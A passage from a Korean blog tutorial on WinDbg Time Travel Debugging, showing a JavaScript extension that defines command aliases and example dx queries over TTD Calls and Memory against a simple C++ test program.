pos2</span>)</span>{<span class="hljs-comment">/*</span><span class="hljs-comment">alias: poscmp</span><span class="hljs-comment">parameters:</span><span class="hljs-comment">pos1 &amp; pos2: Position object or string(Sequence:Steps in hexadicimal)</span><span class="hljs-comment">usage:</span><span class="hljs-comment">&gt; !poscmp(pos1, pos2)</span><span class="hljs-comment">&gt; dx @$poscmp(pos1, pos2)</span><span class="hljs-comment">example:</span><span class="hljs-comment">&gt; dx @$calls(&quot;function&quot;).Where(x =&gt; @$poscmp(&quot;17C83A:1777&quot;, x.TimeStart) &lt; 0).Where(x =&gt; @$poscmp(&quot;17C861:1B3A&quot;, x.TimeEnd) &gt; 0)</span><span class="hljs-comment">=&gt; get all `function` calls between 17C83A:1777 and 17C861:1B3A</span><span class="hljs-comment">*/</span>pos1 = ttdParsePosition(pos1)pos2 = ttdParsePosition(pos2)<span class="hljs-keyword">if</span>(pos1.Sequence != pos2.Sequence){<span class="hljs-keyword">return</span> pos1.Sequence - pos2.Sequence}<span class="hljs-keyword">return</span> pos1.Steps - pos2.Steps}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__d</span>(<span class="hljs-params">...args</span>)</span>{<span class="hljs-keyword">return</span> host.memory.readMemoryValues(...args)}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">initializeScript</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-keyword">return</span> [        <span class="hljs-keyword">new</span> host.apiVersionSupport(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>),        <span class="hljs-keyword">new</span> host.functionAlias(            __calls,            <span class="hljs-string">&apos;calls&apos;</span>        ),<span class="hljs-keyword">new</span> host.functionAlias(__memory,<span class="hljs-string">&apos;memory&apos;</span>),<span class="hljs-keyword">new</span> host.functionAlias(__memoryforpositionrange,<span class="hljs-string">&apos;memoryrange&apos;</span>),<span class="hljs-keyword">new</span> host.functionAlias(__ttd_position_compare,<span class="hljs-string">&apos;poscmp&apos;</span>),<span class="hljs-keyword">new</span> host.functionAlias(__d,<span class="hljs-string">&apos;d&apos;</span>)    ];}</code></pre><p><code>imperative</code> &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC640; &#xD06C;&#xAC8C; &#xB2E4;&#xB978; &#xBD80;&#xBD84;&#xC774; &#xC788;&#xC8E0;? &#xBC14;&#xB85C; <code>initializeScript</code> &#xD568;&#xC218;&#xC5D0; <code>host.functionAlias</code>&#xB85C; &#xD568;&#xC218;&#xC758; alias&#xB97C; &#xC0DD;&#xC131;&#xD55C;&#xB2E4;&#xB294; &#xC810;&#xC785;&#xB2C8;&#xB2E4;. extension &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB294; &#xC774;&#xB7F0; &#xC2DD;&#xC73C;&#xB85C; javascript&#xB85C; &#xAD6C;&#xD604;&#xD55C; &#xAE30;&#xB2A5;&#xC744; alias&#xB85C; &#xB4F1;&#xB85D;&#xD574;&#xC11C; &#xCEE4;&#xB9E8;&#xB4DC;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC800;&#xB294; &#xC77C;&#xB2E8; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; TTD&#xC5D0;&#xC11C; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xD558;&#xB294; <code>@$cursession.TTD.Calls</code> &#xC640; <code>@$cursession.TTD.Memory</code>&#xC758; alias&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC11C; &#xC190;&#xAC00;&#xB77D;&#xC758; &#xD53C;&#xB85C;&#xB97C; &#xC904;&#xC774;&#xB294; &#xD3B8;&#xC785;&#xB2C8;&#xB2E4; &#x1F60E;</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__calls</span>(<span class="hljs-params">...args</span>)</span>{<span class="hljs-keyword">return</span> host.currentSession.TTD.Calls(...args)}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__memory</span>(<span class="hljs-params">...args</span>)</span>{<span class="hljs-keyword">return</span> host.currentSession.TTD.Memory(...args)}</code></pre><p>&#xC774;&#xB7EC;&#xBA74; &#xAC01;&#xAC01; <code>@$calls</code>, <code>@$memory</code> &#xB85C; &#xC904;&#xC5EC;&#xC11C; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xC774;&#xAC78; &#xC5B4;&#xB514;&#xC5D0; &#xC4F0;&#xB0D0;&#xACE0;&#xC694;? </p><h3 id="TTD-Calls-amp-Memory"><a href="#TTD-Calls-amp-Memory" class="headerlink" title="TTD Calls &amp; Memory"></a>TTD Calls &amp; Memory</h3><p>&#xC608;&#xC804;&#xC5D0; Fabu1ous&#xB2D8;&#xC774; &#xC4F4; <a href="https://hackyboiz.github.io/2021/03/14/fabu1ous/ttd-3/#Filtering-in-a-query">&#xC2DC;&#xAC04;&#xC744; &#xC5EC;&#xD589;&#xD558;&#xB294; &#xD574;&#xCEE4;&#xB97C; &#xC704;&#xD55C; &#xC548;&#xB0B4;&#xC11C;</a> &#xC2DC;&#xB9AC;&#xC988;&#xC5D0; &#xC0B4;&#xC9DD; Calls&#xC640; Memory&#xC758; &#xC6A9;&#xB3C4;&#xAC00; &#xC124;&#xBA85;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xB370;&#xC694;? &#xD2B9;&#xC815; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC774;&#xB098; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC;&#xC744; &#xAC80;&#xC0C9;&#xD574;&#xC11C; &#xBCFC; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC815;&#xB3C4;&#xB9CC; &#xC9DA;&#xACE0; &#xB118;&#xC5B4;&#xAC00;&#xC11C; TTD&#xC758; &#xC704;&#xB300;&#xD568;&#xC774; &#xB35C; &#xC804;&#xB2EC;&#xB418;&#xC5C8;&#xB358; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xBB34;&#xD2BC; &#xC774;&#xAC70;&#xB3C4; &#xC608;&#xC81C;&#xB97C; &#xC4F0;&#xBA74;&#xC11C; &#xC5B4;&#xB5BB;&#xAC8C; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBCF4;&#xC2DC;&#xC8E0;</p><p>&#xC77C;&#xB2E8; extension &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC368;&#xC11C; &#xB85C;&#xB4DC;&#xBD80;&#xD130; &#xD569;&#xC2DC;&#xB2E4;</p><pre><code class="hljs routeros">0:038&gt; .scriptload utils.jsJavaScript<span class="hljs-built_in"> script </span>successfully loaded <span class="hljs-keyword">from</span> <span class="hljs-string">&apos;D:\windbg_Ext\utils.js&apos;</span></code></pre><p>&#xADF8;&#xB7FC; &#xC774;&#xC81C; Calls&#xC640; Memory&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xB54C; &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xC811;&#xADFC;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>hackyboiz.github.io<span class="hljs-regexp">/2021/</span><span class="hljs-number">03</span><span class="hljs-regexp">/14/</span>fabu1ous<span class="hljs-regexp">/ttd-3/</span><span class="hljs-comment">#Filtering-in-a-query</span></code></pre><p><code>!calls</code>&#xB97C; &#xC4F0;&#xBA74; &#xCEE4;&#xB9E8;&#xB4DC;&#xC5D0;&#xC11C; &#xB9AC;&#xD134;&#xB41C; &#xBC30;&#xC5F4;&#xC5D0; &#xBC14;&#xB85C; &#xC811;&#xADFC;&#xD560; &#xC218;&#xAC00; &#xC5C6;&#xC5B4;&#xC11C; &#xC800;&#xB294;  <code>dx @$calls</code>&#xB97C; &#xB354; &#xC790;&#xC8FC; &#xD65C;&#xC6A9;&#xD558;&#xB294; &#xD3B8;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xC544;&#xB798;&#xC758; &#xC608;&#xC81C;&#xB97C; &#xB179;&#xD654;&#xD55C; TTD&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC5B4;&#xB5BB;&#xAC8C; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC744;&#xC9C0; &#xC0B4;&#xD3B4;&#xBCF4;&#xC8E0;!</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;random&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstdlib&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ctime&gt;</span></span><span class="hljs-comment">// Base class</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseProcessor</span> {</span><span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">process</span><span class="hljs-params">(<span class="hljs-keyword">int</span> value)</span> </span>= <span class="hljs-number">0</span>;    <span class="hljs-keyword">virtual</span> ~BaseProcessor() = <span class="hljs-keyword">default</span>;};<span class="hljs-comment">// Derived class with actual behavior</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteProcessor</span> :</span> <span class="hljs-keyword">public</span> BaseProcessor {<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process</span><span class="hljs-params">(<span class="hljs-keyword">int</span> value)</span> <span class="hljs-keyword">override</span> </span>{        <span class="hljs-comment">// Dummy operation to prevent optimization</span>        <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">int</span> sink = value;        (<span class="hljs-keyword">void</span>)sink; <span class="hljs-comment">// Prevent unused variable warning</span>    }};<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{    <span class="hljs-built_in">std</span>::srand(<span class="hljs-keyword">static_cast</span>&lt;<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>&gt;(<span class="hljs-built_in">std</span>::time(<span class="hljs-literal">nullptr</span>)));    <span class="hljs-function"><span class="hljs-built_in">std</span>::mt19937 <span class="hljs-title">rng</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::random_device{}())</span></span>;    <span class="hljs-function"><span class="hljs-built_in">std</span>::uniform_int_distribution&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">distIndex</span><span class="hljs-params">(<span class="hljs-number">0</span>, <span class="hljs-number">9</span>)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">std</span>::uniform_int_distribution&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">distValue</span><span class="hljs-params">(<span class="hljs-number">0</span>, <span class="hljs-number">1000</span>)</span></span>;    <span class="hljs-comment">// Create at least 10 instances</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;BaseProcessor&gt;&gt; processors;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; ++i) {        processors.push_back(<span class="hljs-built_in">std</span>::make_unique&lt;ConcreteProcessor&gt;());    }    <span class="hljs-comment">// Call virtual function 100 times with random instance and value</span>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; ++i) {        <span class="hljs-keyword">int</span> idx = distIndex(rng);        <span class="hljs-keyword">int</span> value = distValue(rng);        processors[idx]-&gt;process(value);    }    <span class="hljs-comment">// Wait for user input</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;All calls completed. Press Enter to exit...&quot;</span>;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span>.get();    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><blockquote><p><del>&#xC774;&#xAC70;&#xB3C4; ChatGPT&#xAC00; &#xC9E0; &#xCF54;&#xB4DC;&#xC778;&#xAC74; &#xC548; &#xBE44;&#xBC00;</del></p></blockquote><p> Calls&#xC640; Memory&#xC758; &#xD65C;&#xC6A9;&#xBC95;&#xC744; &#xC124;&#xBA85;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xB3D9;&#xC791;&#xC744; &#xD558;&#xB3C4;&#xB85D; &#xB9CC;&#xB4E4;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xD074;&#xB798;&#xC2A4;&#xC758; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB97C; 10&#xAC1C; &#xC0DD;&#xC131;&#xD574;&#xC11C; &#xC0AC;&#xC6A9;</li><li>&#xD074;&#xB798;&#xC2A4;&#xC758; &#xAC00;&#xC0C1;&#xD568;&#xC218;(<code>process</code>)&#xB97C; &#xCD1D; 100&#xBC88; &#xD638;&#xCD9C;</li><li>&#xAC00;&#xC0C1;&#xD568;&#xC218; &#xD638;&#xCD9C;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#xC778;&#xC790;&#xC5D0; &#xB79C;&#xB364;&#xD55C; &#xAC12; &#xC0AC;&#xC6A9;</li><li>&#xAC00;&#xC0C1;&#xD568;&#xC218; &#xD638;&#xCD9C;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB97C; &#xB79C;&#xB364;&#xD558;&#xAC8C; &#xC120;&#xD0DD;</li></ul><p>&#xADF9;&#xB2E8;&#xC801;&#xC778; &#xC608;&#xC2DC;&#xC774;&#xAE34; &#xD558;&#xC9C0;&#xB9CC; &#xBD84;&#xC11D;&#xC744; &#xD558;&#xB2E4; &#xBCF4;&#xBA74; &#xC758;&#xC678;&#xB85C; &#xC774;&#xC640; &#xBE44;&#xC2B7;&#xD55C; &#xC0C1;&#xD669;&#xC5D0; &#xCC98;&#xD558;&#xAC8C; &#xB418;&#xB354;&#xB77C;&#xACE0;&#xC694;. </p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xC81C;&#xAC00; Calls&#xC640; Memory&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC8FC;&#xB41C; &#xBAA9;&#xC801;&#xC740; &#xC544;&#xB798;&#xC758; &#xC138; &#xAC00;&#xC9C0; &#xC815;&#xB3C4;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD2B9;&#xC815; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC5D0; &#xC758;&#xD55C; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xB9CC;</li><li>&#xBC18;&#xD658;&#xAC12;&#xC774;&#xB098; &#xC778;&#xC790;&#xB85C; &#xC0AC;&#xC6A9;&#xB41C; &#xAC12;&#xC744; &#xD544;&#xD130;&#xB9C1;</li><li>TTD Position &#xBE44;&#xAD50;&#xB97C; &#xD1B5;&#xD574; &#xD2B9;&#xC815; &#xC2DC;&#xC810; &#xC774;&#xC804;/&#xC774;&#xD6C4;&#xC758; &#xD638;&#xCD9C;, &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC;&#xB9CC; &#xD544;&#xD130;&#xB9C1;</li></ol><p>&#xADF8;&#xB7FC; &#xBC14;&#xB85C; Calls&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;. &#xC77C;&#xB2E8; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>Count</code>&#xB97C; &#xD1B5;&#xD574; &#xD568;&#xC218;&#xAC00; &#xBA87; &#xBC88; &#xD638;&#xCD9C;&#xB41C;&#xC9C0; &#xBCFC; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;?</p><pre><code class="hljs arcade"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx @<span class="hljs-symbol">$calls</span>(<span class="hljs-string">&quot;TTDCalls!ConcreteProcessor::process&quot;</span>).<span class="hljs-built_in">Count</span>()@<span class="hljs-symbol">$calls</span>(<span class="hljs-string">&quot;TTDCalls!ConcreteProcessor::process&quot;</span>).<span class="hljs-built_in">Count</span>() : <span class="hljs-number">0x64</span></code></pre><p>0x64(100)&#xBC88;&#xC758; &#xD638;&#xCD9C; &#xC911;&#xC5D0;&#xC11C; &#xB2E4;&#xC12F; &#xBC88;&#xC9F8;&#xB85C; &#xC0DD;&#xC131;&#xB41C; <code>ConcreteProcessor</code> &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC5D0; &#xC758;&#xD55C; &#xD638;&#xCD9C;&#xB9CC; &#xBCF4;&#xB824;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C; &#xD574;&#xC57C;&#xD560;&#xAE4C;&#xC694;? &#xC77C;&#xB2E8; &#xB2E4;&#xC12F; &#xBC88;&#xC9F8;&#xB85C; &#xC0DD;&#xC131;&#xB41C; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xC758; &#xC8FC;&#xC18C;&#xBD80;&#xD130; &#xD655;&#xC778;&#xD574;&#xC57C;&#xACA0;&#xC8E0;? &#xC6D0;&#xB798;&#xAC19;&#xC73C;&#xBA74; &#xD074;&#xB798;&#xC2A4;&#xC758; &#xC0DD;&#xC131;&#xC790;&#xC758; &#xD638;&#xCD9C;&#xC744; &#xB9AC;&#xC2A4;&#xD305;&#xD558;&#xACE0; &#xADF8; &#xC911; &#xB2E4;&#xC12F; &#xBC88;&#xC9F8; &#xD638;&#xCD9C;&#xC758; &#xBC18;&#xD658;&#xAC12;&#xC744; &#xD655;&#xC778;&#xD588;&#xACA0;&#xC9C0;&#xB9CC; &#xC704; &#xC608;&#xC81C;&#xC5D0;&#xC11C;&#xB294; <code>std::make_unique</code> &#xB97C; &#xD1B5;&#xD574; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xC788;&#xC73C;&#xB2C8; &#xC774;&#xAC78; &#xC774;&#xC6A9;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; u TTDCalls!main+b0TTDCalls!std::make_unique [C:\Program Files\Microsoft Visual Studio\<span class="hljs-number">2022</span>\Community\VC\Tools\MSVC\<span class="hljs-number">14.41</span><span class="hljs-number">.34120</span>\include\memory @ <span class="hljs-number">3597</span>] [inlined <span class="hljs-keyword">in</span> TTDCalls!main+<span class="hljs-number">0xb0</span> [D:\Src\WindbgExamplePrograms\TTDCalls\main.cpp @ <span class="hljs-number">34</span>]]:<span class="hljs-number">00007f</span>f7`<span class="hljs-number">84</span>d91260 b908000000      mov     ecx,<span class="hljs-number">8</span><span class="hljs-number">00007f</span>f7`<span class="hljs-number">84</span>d91265 e8c6080000      call    TTDCalls!operator new (<span class="hljs-number">00007f</span>f7`<span class="hljs-number">84</span>d91b30)<span class="hljs-number">00007f</span>f7`<span class="hljs-number">84</span>d9126a <span class="hljs-number">488930</span>          mov     qword ptr [rax],rsi<span class="hljs-number">00007f</span>f7`<span class="hljs-number">84</span>d9126d <span class="hljs-number">4889442420</span>      mov     qword ptr [rsp+<span class="hljs-number">20</span>h],rax<span class="hljs-number">00007f</span>f7`<span class="hljs-number">84</span>d91272 <span class="hljs-number">488</span>b542438      mov     rdx,qword ptr [rsp+<span class="hljs-number">38</span>h]<span class="hljs-number">00007f</span>f7`<span class="hljs-number">84</span>d91277 <span class="hljs-number">483</span>b542440      cmp     rdx,qword ptr [rsp+<span class="hljs-number">40</span>h]<span class="hljs-number">00007f</span>f7`<span class="hljs-number">84</span>d9127c <span class="hljs-number">740</span>e            je      TTDCalls!main+<span class="hljs-number">0xdc</span> (<span class="hljs-number">00007f</span>f7`<span class="hljs-number">84</span>d9128c)<span class="hljs-number">00007f</span>f7`<span class="hljs-number">84</span>d9127e <span class="hljs-number">488</span>bcf          mov     rcx,rdi</code></pre><p>&#xADFC;&#xB370; <code>std::make_unique</code>&#xAC00; &#xC778;&#xB77C;&#xC778; &#xD568;&#xC218;&#xB85C; &#xCC98;&#xB9AC;&#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC11C; Calls&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218;&#xAC00; &#xC5C6;&#xB294;&#xB370;&#xC694;? &#xADF8;&#xB807;&#xB2E4;&#xACE0; <code>TTDCalls!operator new</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xAD00;&#xB828; &#xC5C6;&#xB294; &#xB2E4;&#xB978; &#xD638;&#xCD9C;&#xB3C4; &#xBCF4;&#xC5EC;&#xC9C8; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; <code>call TTDCalls!operator new</code> &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC758; &#xC8FC;&#xC18C;&#xC5D0; &#xC2E4;&#xD589;(&#x201D;e&#x201D;)&#xC73C;&#xB85C; &#xC811;&#xADFC;&#xD558;&#xB294; &#xC2DC;&#xC810;&#xC744; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; Memory&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xB9AC;&#xC2A4;&#xD305;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx @$memory(<span class="hljs-number">0x7ff784d91265</span>, <span class="hljs-number">0x7ff784d91265</span>+<span class="hljs-number">1</span>, <span class="hljs-string">&quot;e&quot;</span>)@$memory(<span class="hljs-number">0x7ff784d91265</span>, <span class="hljs-number">0x7ff784d91265</span>+<span class="hljs-number">1</span>, <span class="hljs-string">&quot;e&quot;</span>)                    [<span class="hljs-number">0x0</span>]               [<span class="hljs-number">0x1</span>]               [<span class="hljs-number">0x2</span>]               [<span class="hljs-number">0x3</span>]               [<span class="hljs-number">0x4</span>]               [<span class="hljs-number">0x5</span>]               [<span class="hljs-number">0x6</span>]               [<span class="hljs-number">0x7</span>]               [<span class="hljs-number">0x8</span>]               [<span class="hljs-number">0x9</span>]</code></pre><p>&#xADF8;&#xB7F0;&#xB370; Memory&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAC8C; &#xB418;&#xBA74; Calls&#xC640; &#xB2EC;&#xB9AC; &#xD574;&#xB2F9; &#xC2DC;&#xC810;&#xC73C;&#xB85C; &#xC774;&#xB3D9;&#xD574;&#xC57C; &#xC0AC;&#xC6A9;&#xB41C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB098; &#xBC18;&#xD658;&#xAC12;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;? &#xC9C0;&#xAE08;&#xAC19;&#xC740; &#xC0C1;&#xD669;&#xC5D0;&#xC11C;&#xB294; <code>00007ff784d91265</code>&#xB77C;&#xB294; &#xC8FC;&#xC18C;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB41C; <code>operator new</code>&#xB294; <code>ReturnAddress</code>&#xAC00; <code>00007ff784d9126a</code>&#xC77C;&#xD14C;&#xB2C8; &#xC774;&#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xB3C4; &#xBC29;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx @$calls(<span class="hljs-string">&quot;TTDCalls!operator new&quot;</span>).Where(x =&gt; x.ReturnAddress == <span class="hljs-number">0x7ff784d9126a</span>)@$calls(<span class="hljs-string">&quot;TTDCalls!operator new&quot;</span>).Where(x =&gt; x.ReturnAddress == <span class="hljs-number">0x7ff784d9126a</span>)                    [<span class="hljs-number">0x0</span>]               [<span class="hljs-number">0x2</span>]               [<span class="hljs-number">0x4</span>]               [<span class="hljs-number">0x6</span>]               [<span class="hljs-number">0x8</span>]               [<span class="hljs-number">0xa</span>]               [<span class="hljs-number">0xb</span>]               [<span class="hljs-number">0xd</span>]               [<span class="hljs-number">0xe</span>]               [<span class="hljs-number">0xf</span>]</code></pre><p>&#xC9C0;&#xAE08;&#xC740; &#xB458;&#xC911; &#xC5B4;&#xB5A4; &#xBC29;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB354;&#xB77C;&#xB3C4; &#xC18C;&#xC694;&#xB418;&#xB294; &#xC2DC;&#xAC04;&#xC740; &#xBE44;&#xC2B7;&#xD560;&#xD14C;&#xB2C8; Memory&#xC758; &#xACB0;&#xACFC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;. &#xB2E4;&#xC12F; &#xBC88;&#xC9F8; &#xD638;&#xCD9C;&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx @$memory(<span class="hljs-number">0x7ff784d91265</span>, <span class="hljs-number">0x7ff784d91265</span>+<span class="hljs-number">1</span>, <span class="hljs-string">&quot;e&quot;</span>)[<span class="hljs-number">4</span>]@$memory(<span class="hljs-number">0x7ff784d91265</span>, <span class="hljs-number">0x7ff784d91265</span>+<span class="hljs-number">1</span>, <span class="hljs-string">&quot;e&quot;</span>)[<span class="hljs-number">4</span>]                    EventType        : <span class="hljs-number">0x1</span>    ThreadId         : <span class="hljs-number">0x567c</span>    UniqueThreadId   : <span class="hljs-number">0x2</span>    TimeStart        : <span class="hljs-number">4</span>D8:<span class="hljs-number">24</span>A2 [Time Travel]    TimeEnd          : <span class="hljs-number">4</span>D8:<span class="hljs-number">24</span>A2 [Time Travel]    AccessType       : Execute    IP               : <span class="hljs-number">0x7ff784d91265</span>    Address          : <span class="hljs-number">0x7ff784d91265</span>    Size             : <span class="hljs-number">0x5</span>    Value            : <span class="hljs-number">0x8c6e8</span>    SystemTimeStart  : <span class="hljs-number">2025</span>&#xB144; <span class="hljs-number">5</span>&#xC6D4; <span class="hljs-number">31</span>&#xC77C; &#xD1A0;&#xC694;&#xC77C; <span class="hljs-number">12</span>:<span class="hljs-number">24</span>:<span class="hljs-number">28.628</span>    SystemTimeEnd    : <span class="hljs-number">2025</span>&#xB144; <span class="hljs-number">5</span>&#xC6D4; <span class="hljs-number">31</span>&#xC77C; &#xD1A0;&#xC694;&#xC77C; <span class="hljs-number">12</span>:<span class="hljs-number">24</span>:<span class="hljs-number">28.628</span><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx @$memory(<span class="hljs-number">0x7ff784d91265</span>, <span class="hljs-number">0x7ff784d91265</span>+<span class="hljs-number">1</span>, <span class="hljs-string">&quot;e&quot;</span>)[<span class="hljs-number">4</span>].TimeStart.SeekTo()(<span class="hljs-number">43f</span>8<span class="hljs-number">.567</span>c): Break instruction exception - code <span class="hljs-number">80000003</span> (first/second chance <span class="hljs-keyword">not</span> available)Time Travel Position: <span class="hljs-number">4</span>D8:<span class="hljs-number">24</span>A2</code></pre><p><code>TimeStart</code>, <code>TimeEnd</code> &#xD544;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74; &#xC774; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC; &#xC774;&#xBCA4;&#xD2B8;&#xAC00; &#xC5B8;&#xC81C; &#xC2DC;&#xC791;&#xD574;&#xC11C; &#xC5B8;&#xC81C; &#xB05D;&#xB098;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. position &#xC606;&#xC5D0; &#xC704;&#xCE58;&#xD55C; <code>[Time Travel]</code>&#xC744; &#xB20C;&#xB7EC;&#xC11C; &#xD574;&#xB2F9; &#xC2DC;&#xC810;&#xC73C;&#xB85C; &#xC774;&#xB3D9;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xACE0; <code>TimeStart</code>&#xB098; <code>TimeEnd</code>&#xC758; <code>SeekTo</code> &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xBC14;&#xB85C; &#xD638;&#xCD9C;&#xD574;&#xC11C; &#xC774;&#xB3D9;&#xD558;&#xB294; &#xAC83;&#xB3C4; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC81C; <code>operator 